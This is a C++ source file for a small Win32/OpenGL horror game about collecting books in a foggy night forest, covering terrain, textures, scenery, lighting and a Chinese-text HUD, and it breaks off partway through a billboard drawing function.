﻿// ============================================================
//  "Escape from Yang Yijing's Forest" (escape-the-forest horror)
//  Single file, Win32 + OpenGL 1.1 fixed pipeline, no deps
//
//  Build (VS developer prompt):
//    cl /O2 /EHsc dream3d.cpp /link opengl32.lib glu32.lib user32.lib gdi32.lib winmm.lib
//
//  Controls: WASD move, Mouse look, Space jump, ESC quit
// ============================================================
#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <mmsystem.h>
#include <cmath>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#define GL_GLEXT_LEGACY
#include <GL/gl.h>
#include <GL/glu.h>
#include <wincrypt.h>

// Link the Windows/OpenGL libraries from inside the source, so a plain
// Visual Studio project (or a bare "cl dream3d.cpp") builds without having
// to touch Project Properties -> Linker -> Additional Dependencies.
#pragma comment(lib, "opengl32.lib")
#pragma comment(lib, "glu32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "winmm.lib")

// ---------------- Window / globals ----------------
HWND  g_hWnd = NULL;
HDC   g_hDC = NULL;
HGLRC g_hRC = NULL;
bool  g_running = true;
int   g_winW = 800, g_winH = 600;

bool  g_keys[256] = { false };
float g_yaw = 0.0f, g_pitch = 0.0f;
float g_posX = 0.0f, g_posZ = 0.0f;
float g_velY = 0.0f, g_posY = 0.0f;
bool  g_onGround = true;
const float EYE = 1.7f;
const float SENS = 0.0026f;
const float PI2 = 6.28318f;

// ---------------- Terrain height ----------------
float TerrainH(float x, float z) {
    float d = sqrtf(x * x + z * z);
    float flat = d < 60.0f ? d / 60.0f : 1.0f;   // flatten spawn area
    float h = 3.2f * sinf(x * 0.020f) * cosf(z * 0.026f)
            + 1.6f * sinf(x * 0.052f + 1.3f) * sinf(z * 0.044f + 0.7f)
            + 0.8f * sinf(x * 0.11f + 2.1f) * cosf(z * 0.09f + 3.0f);
    return h * flat;
}

// ---------------- Deterministic pseudo random ----------------
unsigned int g_seed = 20260;
float Rnd() {
    g_seed = g_seed * 1664525u + 1013904223u;
    return (g_seed >> 8) * (1.0f / 16777216.0f);
}

// ---------------- Procedural retro textures (64x64) ----------------
GLuint g_texGrass = 0, g_texStone = 0, g_texSun = 0, g_texCloud = 0, g_texBark = 0, g_texLeaves = 0;
GLuint g_texSky = 0;

// game title: "escape from Yang Yijing's forest" as \u escapes (ASCII-safe source)
static const wchar_t* GAME_TITLE = L"\u9003\u51FA\u6768\u6613\u4EAC\u7684\u68EE\u6797";

// ---------------- gameplay state ----------------
struct Book { float x, z; bool taken; float phase; };
Book   g_books[10];
int    g_booksGot = 0;
bool   g_monsterActive = false;
float  g_monX = 0, g_monZ = 0;
float  g_monFreeze = 0.0f;      // seconds the monster stands still after spawning
int    g_endState = 0;          // 0 playing, 1 win, 2 lose
float  g_intensity = 0.0f;      // monster proximity 0..1
float  g_hbVol = 0.0f;          // heartbeat gain now (smoothed)
float  g_hbTarget = 0.0f;       // heartbeat gain wanted
int    g_hbPos = 0;             // heartbeat playback position
GLuint g_texMonster = 0;
float  g_gameTime = 0.0f;
float  g_time = 0.0f;           // global animation clock

struct Tex64 { unsigned char px[64 * 64][4]; };

// value noise for photo-ish mottled textures
float Hash2(int x, int y) {
    unsigned int h = (unsigned int)(x * 374761393 + y * 668265263);
    h = (h ^ (h >> 13)) * 1274126177u;
    h = h ^ (h >> 16);
    return (h & 0xFFFFFF) / 16777215.0f;
}
float VNoise(float x, float y) {
    int xi = (int)floorf(x), yi = (int)floorf(y);
    float xf = x - xi, yf = y - yi;
    float u = xf * xf * (3 - 2 * xf), v = yf * yf * (3 - 2 * yf);
    float a = Hash2(xi, yi),     b = Hash2(xi + 1, yi);
    float c = Hash2(xi, yi + 1), d = Hash2(xi + 1, yi + 1);
    return a + (b - a) * u + (c - a) * v + (a - b - c + d) * u * v;
}

// horizontally periodic value noise: samples a circle in noise space, so the
// sky texture wraps seamlessly around the dome (no vertical seam when tiled)
float CylNoise(float u, float v, float rad, float vscale) {
    float a = u * PI2;
    return VNoise(cosf(a) * rad + 41.7f, sinf(a) * rad + v * vscale + 13.1f);
}

void SetPx(Tex64& t, int x, int y, int r, int g, int b, int a) {
    x &= 63; y &= 63;
    t.px[y * 64 + x][0] = (unsigned char)r;
    t.px[y * 64 + x][1] = (unsigned char)g;
    t.px[y * 64 + x][2] = (unsigned char)b;
    t.px[y * 64 + x][3] = (unsigned char)a;
}

GLuint MakeTex(Tex64& t, bool alpha) {
    GLuint id; glGenTextures(1, &id);
    glBindTexture(GL_TEXTURE_2D, id);
    gluBuild2DMipmaps(GL_TEXTURE_2D, alpha ? GL_RGBA : GL_RGB,
                      64, 64, GL_RGBA, GL_UNSIGNED_BYTE, t.px);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST_MIPMAP_NEAREST);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_NEAREST);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);
    return id;
}

GLuint LoadBMPTexture(const char* path) {
    FILE* f = fopen(path, "rb");
    if (!f) return 0;
    unsigned char hdr[54];
    if (fread(hdr, 1, 54, f) != 54 || hdr[0] != 'B' || hdr[1] != 'M') {
        fclose(f); return 0;
    }
    int dataOff = *(int*)(hdr + 10);
    int w = *(int*)(hdr + 18), h = *(int*)(hdr + 22);
    short bpp = *(short*)(hdr + 28);
    if (bpp != 24 || w <= 0 || h <= 0) { fclose(f); return 0; }
    int rowSize = (w * 3 + 3) & ~3;
    unsigned char* row = new unsigned char[rowSize];
    unsigned char* data = new unsigned char[w * h * 3];
    fseek(f, dataOff, SEEK_SET);
    for (int y = 0; y < h; y++) {
        if (fread(row, 1, rowSize, f) != (size_t)rowSize) { delete[] row; delete[] data; fclose(f); return 0; }
        // BMP is bottom-up and BGR -> flip and convert
        for (int x = 0; x < w; x++) {
            data[((h - 1 - y) * w + x) * 3 + 0] = row[x * 3 + 2];
            data[((h - 1 - y) * w + x) * 3 + 1] = row[x * 3 + 1];
            data[((h - 1 - y) * w + x) * 3 + 2] = row[x * 3 + 0];
        }
    }
    fclose(f);
    delete[] row;
    GLuint id; glGenTextures(1, &id);
    glBindTexture(GL_TEXTURE_2D, id);
    gluBuild2DMipmaps(GL_TEXTURE_2D, GL_RGB, w, h, GL_RGB, GL_UNSIGNED_BYTE, data);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST_MIPMAP_NEAREST);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_NEAREST);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);
    delete[] data;
    return id;
}

// uncompressed 32-bit TGA with alpha (for foliage cutout cards)
GLuint LoadTGATexture(const char* path) {
    FILE* f = fopen(path, "rb");
    if (!f) return 0;
    unsigned char hdr[18];
    if (fread(hdr, 1, 18, f) != 18) { fclose(f); return 0; }
    int idlen = hdr[0];
    int imgType = hdr[2];
    int w = hdr[12] | (hdr[13] << 8);
    int h = hdr[14] | (hdr[15] << 8);
    int bpp = hdr[16];
    if (imgType != 2 || bpp != 32 || w <= 0 || h <= 0) { fclose(f); return 0; }
    fseek(f, 18 + idlen, SEEK_SET);
    unsigned char* data = new unsigned char[w * h * 4];
    if (fread(data, 1, w * h * 4, f) != (size_t)(w * h * 4)) {
        delete[] data; fclose(f); return 0;
    }
    fclose(f);
    // NOTE: our TGA files are stored bottom-up (standard), which is exactly
    // what glTexImage2D wants for t=0 at the bottom -- do NOT flip rows here,
    // flipping made the monster appear upside down.
    for (int i = 0; i < w * h; i++) {           // BGRA -> RGBA
        unsigned char b = data[i * 4 + 0];
        data[i * 4 + 0] = data[i * 4 + 2];
        data[i * 4 + 2] = b;
    }
    GLuint id; glGenTextures(1, &id);
    glBindTexture(GL_TEXTURE_2D, id);
    gluBuild2DMipmaps(GL_TEXTURE_2D, GL_RGBA, w, h, GL_RGBA, GL_UNSIGNED_BYTE, data);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST_MIPMAP_NEAREST);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_NEAREST);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP);
    delete[] data;
    return id;
}

void BuildTextures() {
    // --- moon: pale bone-white disc, sickly and mottled (additive glow) ---
    Tex64 sun;
    for (int y = 0; y < 64; y++)
        for (int x = 0; x < 64; x++) {
            float dx = x - 31.5f, dy = y - 31.5f;
            float d = sqrtf(dx * dx + dy * dy) / 32.0f;
            int a = d < 0.80f ? 255 : (int)(255 * (1.0f - (d - 0.80f) / 0.20f));
            if (a < 0) a = 0;
            float mot = VNoise(x / 7.0f + 3.3f, y / 7.0f + 8.8f);   // craters
            float k = 1.0f - 0.28f * mot;
            int r = (int)((225 - d * 55) * k);
            int gg = (int)((228 - d * 40) * k);
            int b = (int)((200 - d * 30) * k);
            SetPx(sun, x, y, r, gg, b, a);
        }
    g_texSun = MakeTex(sun, true);

    // --- cloud: dark misty wisp, semi transparent (creepy fog banks) ---
    Tex64 cl;
    for (int y = 0; y < 64; y++)
        for (int x = 0; x < 64; x++) SetPx(cl, x, y, 0, 0, 0, 0);
    for (int i = 0; i < 9; i++) {
        float cx = 10 + Rnd() * 44, cy = 24 + Rnd() * 18;
        float r = 7 + Rnd() * 9;
        for (int y = 0; y < 64; y++)
            for (int x = 0; x < 64; x++) {
                float d = sqrtf((x - cx) * (x - cx) + (y - cy) * (y - cy)) / r;
                if (d < 1.0f) {
                    int a = (int)(150 * (1.0f - d * 0.55f));
                    SetPx(cl, x, y, 44, 47, 56, a);
                }
            }
    }
    g_texCloud = MakeTex(cl, true);

    // --- sky: dark storm-cloud texture, seamless around the dome ---
    Tex64 sk;
    for (int y = 0; y < 64; y++)
        for (int x = 0; x < 64; x++) {
            float u = x / 64.0f, v = y / 64.0f;
            float n = 0.50f * CylNoise(u, v, 1.6f, 3.0f)
                    + 0.30f * CylNoise(u, v, 3.4f, 6.0f)
                    + 0.20f * CylNoise(u, v, 6.8f, 12.0f);
            n = (n - 0.5f) * 1.9f + 0.5f;
            if (n < 0) n = 0; if (n > 1) n = 1;
            float base = 26 + n * 62;
            SetPx(sk, x, y, (int)(base * 0.96f), (int)(base * 1.02f), (int)(base * 1.18f), 255);
        }
    g_texSky = MakeTex(sk, false);

    // --- photo textures: the game expects these files, no fallback ---
    g_texGrass   = LoadBMPTexture("textures/grass.bmp");
    g_texStone   = LoadBMPTexture("textures/stone.bmp");
    g_texBark    = LoadBMPTexture("textures/bark.bmp");
    g_texLeaves  = LoadTGATexture("textures/leaves.tga");
    g_texMonster = LoadTGATexture("textures/monster.tga");

    const char* missing = !g_texGrass   ? "textures/grass.bmp"
                        : !g_texStone   ? "textures/stone.bmp"
                        : !g_texBark    ? "textures/bark.bmp"
                        : !g_texLeaves  ? "textures/leaves.tga"
                        : !g_texMonster ? "textures/monster.tga"
                        : NULL;
    if (missing) {
        wchar_t msg[512];
        swprintf_s(msg, L"\u7F3A\u5C11\u8D34\u56FE\u6587\u4EF6:\n%hs\n\n"
                        L"\u8BF7\u628A\u6587\u4EF6\u5939\u548C\u7A0B\u5E8F\u653E\u5728\u4E00\u8D77",
                   missing);
        ShowWindow(g_hWnd, SW_HIDE);         // else the dialog hides behind it
        MessageBoxW(NULL, msg, GAME_TITLE, MB_OK | MB_ICONERROR);
        ExitProcess(0);
    }
}

// ---------------- Scene geometry (display lists) ----------------
GLuint g_dlTerrain = 0, g_dlSky = 0, g_dlTree = 0, g_dlRuins = 0;

void TerrainNormal(float x, float z) {
    float e = 1.5f;
    float nx = TerrainH(x - e, z) - TerrainH(x + e, z);
    float nz = TerrainH(x, z - e) - TerrainH(x, z + e);
    float ny = 2 * e;
    float len = sqrtf(nx * nx + ny * ny + nz * nz);
    glNormal3f(nx / len, ny / len, nz / len);
}

void BuildTerrain() {
    const int N = 96;
    const float SIZE = 420.0f;
    const float STEP = SIZE / N;
    g_dlTerrain = glGenLists(1);
    glNewList(g_dlTerrain, GL_COMPILE);
    glBindTexture(GL_TEXTURE_2D, g_texGrass);
    glBegin(GL_TRIANGLES);
    for (int j = 0; j < N; j++)
        for (int i = 0; i < N; i++) {
            float x0 = -SIZE / 2 + i * STEP, z0 = -SIZE / 2 + j * STEP;
            float x1 = x0 + STEP, z1 = z0 + STEP;
            float h00 = TerrainH(x0, z0), h10 = TerrainH(x1, z0);
            float h01 = TerrainH(x0, z1), h11 = TerrainH(x1, z1);
            float u0 = x0 / 10, u1 = x1 / 10, v0 = z0 / 10, v1 = z1 / 10;

            TerrainNormal(x0, z0); glTexCoord2f(u0, v0); glVertex3f(x0, h00, z0);
            TerrainNormal(x1, z0); glTexCoord2f(u1, v0); glVertex3f(x1, h10, z0);
            TerrainNormal(x1, z1); glTexCoord2f(u1, v1); glVertex3f(x1, h11, z1);

            TerrainNormal(x0, z0); glTexCoord2f(u0, v0); glVertex3f(x0, h00, z0);
            TerrainNormal(x1, z1); glTexCoord2f(u1, v1); glVertex3f(x1, h11, z1);
            TerrainNormal(x0, z1); glTexCoord2f(u0, v1); glVertex3f(x0, h01, z1);
        }
    glEnd();
    glEndList();
}

void BuildSky() {
    // Dark storm sky: seamless cloud texture modulated by a vertical tint.
    // Horizon keeps a sickly murk; the zenith sinks to near black.
    const int RINGS = 10, SEGS = 24;
    const float R = 400.0f;
    const float UTILE = 3.0f;                     // texture wraps around the dome
    float col[11][3] = {
        {0.62f, 0.66f, 0.60f}, {0.56f, 0.60f, 0.55f}, {0.48f, 0.52f, 0.49f},
        {0.38f, 0.41f, 0.40f}, {0.28f, 0.30f, 0.32f}, {0.20f, 0.21f, 0.25f},
        {0.14f, 0.14f, 0.19f}, {0.10f, 0.10f, 0.15f}, {0.07f, 0.07f, 0.11f},
        {0.05f, 0.05f, 0.08f}, {0.04f, 0.04f, 0.06f}
    };
    g_dlSky = glGenLists(1);
    glNewList(g_dlSky, GL_COMPILE);
    glDisable(GL_FOG); glDisable(GL_LIGHTING);
    glBindTexture(GL_TEXTURE_2D, g_texSky);
    glBegin(GL_QUAD_STRIP);
    for (int r = 0; r < RINGS; r++) {
        float a0 = r / (float)RINGS * 1.5708f;
        float a1 = (r + 1) / (float)RINGS * 1.5708f;
        float v0 = r / (float)RINGS, v1 = (r + 1) / (float)RINGS;
        for (int s = 0; s <= SEGS; s++) {
            float ang = s / (float)SEGS * PI2;
            float cx = cosf(ang), sz = sinf(ang);
            glColor3fv(col[r]);
            glTexCoord2f(s / (float)SEGS * UTILE, v0);
            glVertex3f(cx * R * cosf(a0), sinf(a0) * R, sz * R * cosf(a0));
            glColor3fv(col[r + 1]);
            glTexCoord2f(s / (float)SEGS * UTILE, v1);
            glVertex3f(cx * R * cosf(a1), sinf(a1) * R, sz * R * cosf(a1));
        }
    }
    glEnd();
    glColor3f(1, 1, 1);
    glEndList();
}

void BuildTree() {
    // Low-poly tree: textured bark trunk + two textured foliage cones
    g_dlTree = glGenLists(1);
    glNewList(g_dlTree, GL_COMPILE);
    // trunk: bark photo texture
    glBindTexture(GL_TEXTURE_2D, g_texBark);
    glColor3f(1, 1, 1);
    glBegin(GL_QUADS);
    for (int i = 0; i < 6; i++) {
        float a0 = i / 6.0f * PI2, a1 = (i + 1) / 6.0f * PI2;
        float nx = cosf((a0 + a1) / 2), nz = sinf((a0 + a1) / 2);
        glNormal3f(nx, 0, nz);
        glTexCoord2f(a0 / PI2 * 2, 0);      glVertex3f(cosf(a0) * 0.45f, 0, sinf(a0) * 0.45f);
        glTexCoord2f(a1 / PI2 * 2, 0);      glVertex3f(cosf(a1) * 0.45f, 0, sinf(a1) * 0.45f);
        glTexCoord2f(a1 / PI2 * 2, 1.6f);   glVertex3f(cosf(a1) * 0.45f, 4.5f, sinf(a1) * 0.45f);
        glTexCoord2f(a0 / PI2 * 2, 1.6f);   glVertex3f(cosf(a0) * 0.45f, 4.5f, sinf(a0) * 0.45f);
    }
    glEnd();
    glBegin(GL_TRIANGLE_FAN);
    glNormal3f(0, 1, 0);
    glTexCoord2f(0.5f, 0.5f); glVertex3f(0, 4.5f, 0);
    for (int i = 0; i <= 6; i++) {
        float a = i / 6.0f * PI2;
        glTexCoord2f(0.5f + cosf(a) * 0.5f, 0.5f + sinf(a) * 0.5f);
        glVertex3f(cosf(a) * 0.45f, 4.5f, sinf(a) * 0.45f);
    }
    glEnd();
    // foliage: crossed alpha-tested leaf planes (classic PS1 tree cards)
    glBindTexture(GL_TEXTURE_2D, g_texLeaves);
    glColor3f(1, 1, 1);
    glAlphaFunc(GL_GREATER, 0.45f);
    glEnable(GL_ALPHA_TEST);
    glNormal3f(0, 1, 0);                    // soft even lighting
    const int NPLANES = 4;
    const float w2 = 4.6f, y0 = 1.6f, y1 = 10.0f;
    glBegin(GL_QUADS);
    for (int p = 0; p < NPLANES; p++) {
        float t = p / (float)NPLANES * PI2 + 0.4f;
        float rx = cosf(t), rz = sinf(t);
        glTexCoord2f(0, 0); glVertex3f(-rx * w2, y0, -rz * w2);
        glTexCoord2f(1, 0); glVertex3f( rx * w2, y0,  rz * w2);
        glTexCoord2f(1, 1); glVertex3f( rx * w2, y1,  rz * w2);
        glTexCoord2f(0, 1); glVertex3f(-rx * w2, y1, -rz * w2);
    }
    glEnd();
    glDisable(GL_ALPHA_TEST);
    glColor3f(1, 1, 1);
    glEndList();
}

// Draw a textured box centered at origin, width w, height h, depth d
void DrawBox(float w, float h, float d) {
    float hx = w / 2, hy = h / 2, hz = d / 2;
    glBegin(GL_QUADS);
    // +Z face
    glNormal3f(0, 0, 1);
    glTexCoord2f(0, 0); glVertex3f(-hx, -hy,  hz);
    glTexCoord2f(1, 0); glVertex3f( hx, -hy,  hz);
    glTexCoord2f(1, 1); glVertex3f( hx,  hy,  hz);
    glTexCoord2f(0, 1); glVertex3f(-hx,  hy,  hz);
    // -Z face
    glNormal3f(0, 0, -1);
    glTexCoord2f(0, 0); glVertex3f( hx, -hy, -hz);
    glTexCoord2f(1, 0); glVertex3f(-hx, -hy, -hz);
    glTexCoord2f(1, 1); glVertex3f(-hx,  hy, -hz);
    glTexCoord2f(0, 1); glVertex3f( hx,  hy, -hz);
    // +X face
    glNormal3f(1, 0, 0);
    glTexCoord2f(0, 0); glVertex3f( hx, -hy,  hz);
    glTexCoord2f(1, 0); glVertex3f( hx, -hy, -hz);
    glTexCoord2f(1, 1); glVertex3f( hx,  hy, -hz);
    glTexCoord2f(0, 1); glVertex3f( hx,  hy,  hz);
    // -X face
    glNormal3f(-1, 0, 0);
    glTexCoord2f(0, 0); glVertex3f(-hx, -hy, -hz);
    glTexCoord2f(1, 0); glVertex3f(-hx, -hy,  hz);
    glTexCoord2f(1, 1); glVertex3f(-hx,  hy,  hz);
    glTexCoord2f(0, 1); glVertex3f(-hx,  hy, -hz);
    // top
    glNormal3f(0, 1, 0);
    glTexCoord2f(0, 0); glVertex3f(-hx,  hy,  hz);
    glTexCoord2f(1, 0); glVertex3f( hx,  hy,  hz);
    glTexCoord2f(1, 1); glVertex3f( hx,  hy, -hz);
    glTexCoord2f(0, 1); glVertex3f(-hx,  hy, -hz);
    // bottom
    glNormal3f(0, -1, 0);
    glTexCoord2f(0, 0); glVertex3f(-hx, -hy, -hz);
    glTexCoord2f(1, 0); glVertex3f( hx, -hy, -hz);
    glTexCoord2f(1, 1); glVertex3f( hx, -hy,  hz);
    glTexCoord2f(0, 1); glVertex3f(-hx, -hy,  hz);
    glEnd();
}

void DrawPillar(float h, float r) {
    // hexagonal stone pillar
    glBegin(GL_QUADS);
    for (int i = 0; i < 6; i++) {
        float a0 = i / 6.0f * PI2, a1 = (i + 1) / 6.0f * PI2;
        float nx = cosf((a0 + a1) / 2), nz = sinf((a0 + a1) / 2);
        glNormal3f(nx, 0, nz);
        glTexCoord2f(a0 / PI2 * 3, 0); glVertex3f(cosf(a0) * r, 0, sinf(a0) * r);
        glTexCoord2f(a1 / PI2 * 3, 0); glVertex3f(cosf(a1) * r, 0, sinf(a1) * r);
        glTexCoord2f(a1 / PI2 * 3, h / 4); glVertex3f(cosf(a1) * r, h, sinf(a1) * r);
        glTexCoord2f(a0 / PI2 * 3, h / 4); glVertex3f(cosf(a0) * r, h, sinf(a0) * r);
    }
    glEnd();
    glBegin(GL_TRIANGLE_FAN);
    glNormal3f(0, 1, 0);
    glTexCoord2f(0.5f, 0.5f); glVertex3f(0, h, 0);
    for (int i = 0; i <= 6; i++) {
        float a = i / 6.0f * PI2;
        glTexCoord2f(0.5f + cosf(a) * 0.5f, 0.5f + sinf(a) * 0.5f);
        glVertex3f(cosf(a) * r, h, sinf(a) * r);
    }
    glEnd();
}

void BuildRuins() {
    // Ancient ruin: ring of stone pillars + central stepped altar
    g_dlRuins = glGenLists(1);
    glNewList(g_dlRuins, GL_COMPILE);
    glBindTexture(GL_TEXTURE_2D, g_texStone);
    float cx = 60, cz = -40;
    for (int i = 0; i < 8; i++) {
        float a = i / 8.0f * PI2;
        float px = cx + cosf(a) * 14, pz = cz + sinf(a) * 14;
        glPushMatrix();
        glTranslatef(px, TerrainH(px, pz) - 0.3f, pz);
        float sh = 1.0f;
        if (i % 3 == 0) sh = 0.45f;          // broken pillar
        glScalef(1.0f, sh, 1.0f);
        DrawPillar(7.0f, 1.1f);
        glPopMatrix();
    }
    // central altar: 3 stacked stone slabs
    for (int L = 0; L < 3; L++) {
        float w = 6.0f - L * 1.6f;
        glPushMatrix();
        glTranslatef(cx, TerrainH(cx, cz) - 0.3f + L * 1.2f + 0.6f, cz);
        glRotatef(L * 12.0f, 0, 1, 0);
        DrawBox(w, 1.2f, w);
        glPopMatrix();
    }
    glEndList();
}

// ---------------- Trees and clouds placement ----------------
struct TreeInst { float x, z, s, rot; };
TreeInst g_trees[70];
struct CloudInst { float x, y, z, s; };
CloudInst g_clouds[8];

void Populate() {
    for (int i = 0; i < 70; i++) {
        float x = (Rnd() - 0.5f) * 380, z = (Rnd() - 0.5f) * 380;
        bool bad = (sqrtf(x * x + z * z) < 25);
        float dx = x - 60, dz = z + 40;
        if (dx * dx + dz * dz < 400) bad = true;   // keep ruin area clear
        if (bad) { i--; continue; }
        g_trees[i].x = x; g_trees[i].z = z;
        g_trees[i].s = 0.7f + Rnd() * 0.9f;
        g_trees[i].rot = Rnd() * PI2;
    }
    for (int i = 0; i < 8; i++) {
        g_clouds[i].x = (Rnd() - 0.5f) * 500;
        g_clouds[i].y = 55 + Rnd() * 40;
        g_clouds[i].z = (Rnd() - 0.5f) * 500;
        g_clouds[i].s = 18 + Rnd() * 22;
    }
    // 10 scattered books -- never in the spawn clearing, never inside the
    // ruin, never stuck inside a tree
    for (int i = 0; i < 10; i++) {
        float x, z;
        bool bad;
        do {
            x = (Rnd() - 0.5f) * 340;
            z = (Rnd() - 0.5f) * 340;
            bad = (sqrtf(x * x + z * z) < 20);
            if (!bad) {                          // ruin footprint at (60,-40)
                float dx = x - 60, dz = z + 40;
                if (dx * dx + dz * dz < 19.0f * 19.0f) bad = true;
            }
            for (int t = 0; t < 70 && !bad; t++) {   // tree trunks
                float dx = x - g_trees[t].x, dz = z - g_trees[t].z;
                float rr = 2.5f * g_trees[t].s;
                if (dx * dx + dz * dz < rr * rr) bad = true;
            }
        } while (bad);
        g_books[i].x = x; g_books[i].z = z;
        g_books[i].taken = false;
        g_books[i].phase = Rnd() * PI2;
    }
}

// ---------------- GL init ----------------
void InitGL() {
    BuildTextures();
    Populate();
    glClearColor(0.03f, 0.03f, 0.045f, 1.0f);  // dead of night
    glEnable(GL_DEPTH_TEST);
    glEnable(GL_TEXTURE_2D);
    // NOTE: face culling is OFF on purpose -- our meshes mix windings,
    // and depth test already hides hidden surfaces correctly.
    glDisable(GL_CULL_FACE);

    // cold moonlight, dim: the forest barely holds its shape
    glEnable(GL_LIGHTING);
    glEnable(GL_LIGHT0);
    float sunDir[4] = { -0.35f, 1.0f, 0.45f, 0.0f };
    float sunCol[4] = { 0.62f, 0.68f, 0.74f, 1.0f };
    float ambCol[4] = { 0.20f, 0.22f, 0.27f, 1.0f };
    glLightfv(GL_LIGHT0, GL_POSITION, sunDir);
    glLightfv(GL_LIGHT0, GL_DIFFUSE, sunCol);
    glLightModelfv(GL_LIGHT_MODEL_AMBIENT, ambCol);
    glEnable(GL_COLOR_MATERIAL);
    glColorMaterial(GL_FRONT, GL_AMBIENT_AND_DIFFUSE);

    // murk fog -- the treeline dissolves into a dark sickly haze
    float fogCol[4] = { 0.075f, 0.085f, 0.10f, 1.0f };
    glFogi(GL_FOG_MODE, GL_LINEAR);
    glFogfv(GL_FOG_COLOR, fogCol);
    glFogf(GL_FOG_START, 45.0f);
    glFogf(GL_FOG_END, 200.0f);
    glEnable(GL_FOG);

    BuildTerrain();
    BuildSky();
    BuildTree();
    BuildRuins();

    glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA);
}

// ---------------- HUD text ----------------
// every Chinese glyph used by the HUD (as \u escapes, ASCII-safe source)
static const wchar_t* CN_ALL =
    L"\u4E66\u672C"                                     // shu ben   (books)
    L"\u79FB\u52A8\u9F20\u6807\u8F6C\u5411"             // move mouse turn
    L"\u7A7A\u683C\u8DF3\u8DC3\u9000\u51FA"             // space jump quit
    L"\u6536\u96C6\u5F02\u8C61\u5C06\u5728\u79D2\u540E\u964D\u4E34"
    L"\u5B83\u6B63\u770B\u7740\u4F60\u5FEB\u8DD1\u5371\u9669\uFF01"
    L"\u6E38\u620F\u7ED3\u675F"
    L"\u9003\u51FA\u6768\u6613\u4EAC\u7684\u68EE\u6797"; // game title

#define CN_MAX 128
static wchar_t g_cnSet[CN_MAX];
static int     g_cnN = 0;
static GLuint  g_cnSmall[CN_MAX], g_cnBig[CN_MAX];
static GLuint  g_asciiSmall = 0, g_asciiBig = 0;

void AddCnChars(const wchar_t* s) {
    for (; *s; s++) {
        bool found = false;
        for (int i = 0; i < g_cnN; i++) if (g_cnSet[i] == *s) { found = true; break; }
        if (!found && g_cnN < CN_MAX) g_cnSet[g_cnN++] = *s;
    }
}

void InitFont() {
    // Chinese HUD: bitmap font lists must be generated per Unicode code point.
    // All Chinese literals are written as \uXXXX escapes so the source file
    // stays pure ASCII (MSVC codepage-safe).
    AddCnChars(CN_ALL);
    HFONT fSmall = CreateFontA(32, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                               GB2312_CHARSET, OUT_TT_PRECIS, CLIP_DEFAULT_PRECIS,
                               ANTIALIASED_QUALITY, FF_DONTCARE, "Microsoft YaHei");
    HFONT fBig   = CreateFontA(76, 0, 0, 0, FW_HEAVY, FALSE, FALSE, FALSE,
                               GB2312_CHARSET, OUT_TT_PRECIS, CLIP_DEFAULT_PRECIS,
                               ANTIALIASED_QUALITY, FF_DONTCARE, "Microsoft YaHei");
    SelectObject(g_hDC, fSmall);
    g_asciiSmall = glGenLists(96);
    wglUseFontBitmapsA(g_hDC, 32, 96, g_asciiSmall);
    for (int i = 0; i < g_cnN; i++) {
        g_cnSmall[i] = glGenLists(1);
        wglUseFontBitmapsW(g_hDC, (UINT)g_cnSet[i], 1, g_cnSmall[i]);
    }
    SelectObject(g_hDC, fBig);
    g_asciiBig = glGenLists(96);
    wglUseFontBitmapsA(g_hDC, 32, 96, g_asciiBig);
    for (int i = 0; i < g_cnN; i++) {
        g_cnBig[i] = glGenLists(1);
        wglUseFontBitmapsW(g_hDC, (UINT)g_cnSet[i], 1, g_cnBig[i]);
    }
}

// draw a mixed ASCII / Chinese string in the 2D overlay
void DrawStr(float x, float y, const wchar_t* s, bool big, float r, float g, float b) {
    glDisable(GL_TEXTURE_2D); glDisable(GL_LIGHTING); glDisable(GL_FOG);
    glDisable(GL_DEPTH_TEST);
    glMatrixMode(GL_PROJECTION); glPushMatrix(); glLoadIdentity();
    glOrtho(0, g_winW, g_winH, 0, -1, 1);
    glMatrixMode(GL_MODELVIEW); glPushMatrix(); glLoadIdentity();
    glColor3f(r, g, b);
    glRasterPos2f(x, y);
    GLuint* cn = big ? g_cnBig : g_cnSmall;
    GLuint  asc = big ? g_asciiBig : g_asciiSmall;
    for (const wchar_t* p = s; *p; p++) {
        if (*p < 128) {
            glCallList(asc + (*p - 32));
        } else {
            for (int i = 0; i < g_cnN; i++) {
                if (g_cnSet[i] == *p) { glCallList(cn[i]); break; }
            }
        }
    }
    glMatrixMode(GL_PROJECTION); glPopMatrix();
    glMatrixMode(GL_MODELVIEW); glPopMatrix();
    glEnable(GL_DEPTH_TEST);
    glEnable(GL_LIGHTING); glEnable(GL_FOG);
}

// ---------------- Billboard (sun / clouds) ----------------
void DrawBillboard(float x, float y, float z, float size, GLuint tex) {
    float mf[16];
    glGetFloatv(GL_MODELVIEW_MATRIX, mf);
    float rx = mf[0], ry = mf[4], rz = mf[8];
    float ux = mf[1], uy = mf[5], uz = mf[9];
    float h = size * 0.5f;
    glBindTexture(GL_TEXTURE_2D, tex);
    glBegin(GL_QUADS);
    glTexCoord2f(0, 0); glVertex3f(x - rx * h - ux * h, y - ry * h - uy * h, z - rz * h - uz * h);
    glTexCoord2f(1, 0); glVertex3f(x + rx * h - ux * h, y + ry * h - uy * h, z + rz * h - uz * h);
